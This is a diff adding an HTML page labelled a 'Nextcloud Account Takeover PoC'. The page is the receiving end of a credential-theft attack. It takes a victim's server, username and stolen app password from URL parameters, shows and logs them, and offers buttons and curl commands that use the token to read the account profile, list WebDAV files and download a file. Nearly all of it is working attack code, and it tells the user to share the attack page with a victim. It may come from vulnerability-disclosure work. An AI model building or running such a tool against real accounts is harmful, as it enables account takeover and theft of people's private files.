@@ -1,0 +1,119 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <title>PoC - Captured Credentials</title>
+    <style>
+        body { font-family: monospace; background: #1a1a2e; color: #0f0; padding: 20px; margin: 0; }
+        h1 { color: #ff4444; text-align: center; }
+        .box { background: #16213e; border: 1px solid #0f0; border-radius: 8px; padding: 20px; margin: 20px auto; max-width: 600px; word-break: break-all; }
+        .label { color: #888; font-size: 12px; }
+        .value { color: #0f0; font-size: 16px; margin: 5px 0 15px; }
+        .red { color: #ff4444; }
+        .verify { background: #0f0; color: #000; border: none; padding: 10px 20px; border-radius: 5px; cursor: pointer; font-family: monospace; font-size: 14px; font-weight: bold; margin: 10px 5px; }
+        #result { margin-top: 20px; padding: 15px; background: #0a0a1a; border-radius: 5px; display: none; white-space: pre-wrap; }
+        .timestamp { color: #666; font-size: 11px; text-align: center; }
+    </style>
+</head>
+<body>
+    <h1>Nextcloud Account Takeover PoC</h1>
+    <p class="timestamp" id="time"></p>
+
+    <div class="box">
+        <div class="label">Server:</div>
+        <div class="value" id="server">Waiting...</div>
+
+        <div class="label">Username:</div>
+        <div class="value" id="user">Waiting...</div>
+
+        <div class="label">App Password (stolen):</div>
+        <div class="value red" id="token">Waiting...</div>
+    </div>
+
+    <div style="text-align:center">
+        <button class="verify" onclick="verifyToken()">Verify Token</button>
+        <button class="verify" onclick="listFiles()">List Files</button>
+        <button class="verify" onclick="readFile()">Read First File</button>
+    </div>
+
+    <div id="result"></div>
+
+    <script>
+    var server = "", user = "", token = "";
+
+    // Parse URL parameters
+    var params = new URLSearchParams(window.location.search);
+    server = params.get("s") || params.get("server") || "";
+    user = params.get("u") || params.get("user") || "";
+    token = params.get("p") || params.get("token") || "";
+
+    if (server && user && token) {
+        document.getElementById("server").textContent = server;
+        document.getElementById("user").textContent = user;
+        document.getElementById("token").textContent = token;
+        document.getElementById("time").textContent = "Captured at: " + new Date().toISOString();
+
+        // Log to console for evidence
+        console.log("STOLEN CREDENTIALS:", { server: server, user: user, appPassword: token });
+    } else {
+        document.getElementById("server").textContent = "No credentials received yet.";
+        document.getElementById("user").textContent = "Share the attack page with a victim.";
+        document.getElementById("token").textContent = "-";
+    }
+
+    function showResult(text) {
+        var el = document.getElementById("result");
+        el.style.display = "block";
+        el.textContent = text;
+    }
+
+    async function verifyToken() {
+        showResult("Verifying...");
+        try {
+            var r = await fetch(server + "/ocs/v2.php/cloud/user?format=json", {
+                headers: {
+                    "Authorization": "Basic " + btoa(user + ":" + token),
+                    "OCS-APIRequest": "true"
+                }
+            });
+            var d = await r.json();
+            var u = d.ocs.data;
+            showResult(
+                "TOKEN VALID!\n\n" +
+                "User ID:      " + u.id + "\n" +
+                "Display Name: " + u.displayname + "\n" +
+                "Email:        " + (u.email || "N/A") + "\n" +
+                "Quota Used:   " + u.quota.used + " bytes\n" +
+                "Groups:       " + JSON.stringify(u.groups)
+            );
+        } catch(e) {
+            showResult("Error: " + e.message + "\n(CORS may block browser requests - use curl instead)\n\ncurl -u '" + user + ":" + token + "' -H 'OCS-APIRequest: true' '" + server + "/ocs/v2.php/cloud/user?format=json'");
+        }
+    }
+
+    async function listFiles() {
+        showResult("Listing files...");
+        try {
+            var r = await fetch(server + "/remote.php/dav/files/" + encodeURIComponent(user) + "/", {
+                method: "PROPFIND",
+                headers: {
+                    "Authorization": "Basic " + btoa(user + ":" + token),
+                    "Depth": "1",
+                    "Content-Type": "application/xml"
+                },
+                body: '<?xml version="1.0"?><d:propfind xmlns:d="DAV:"><d:prop><d:displayname/><d:getcontentlength/></d:prop></d:propfind>'
+            });
+            var text = await r.text();
+            var names = text.match(/<d:displayname>([^<]+)<\/d:displayname>/g) || [];
+            showResult("FILES:\n\n" + names.map(function(n) { return "  " + n.replace(/<[^>]+>/g, ""); }).join("\n"));
+        } catch(e) {
+            showResult("CORS blocked. Use curl:\n\ncurl -u '" + user + ":" + token + "' -X PROPFIND -H 'Depth: 1' '" + server + "/remote.php/dav/files/" + encodeURIComponent(user) + "/'");
+        }
+    }
+
+    async function readFile() {
+        showResult("Use curl to read files:\n\ncurl -u '" + user + ":" + token + "' '" + server + "/remote.php/dav/files/" + encodeURIComponent(user) + "/Readme.md'");
+    }
+    </script>
+</body>
+</html>
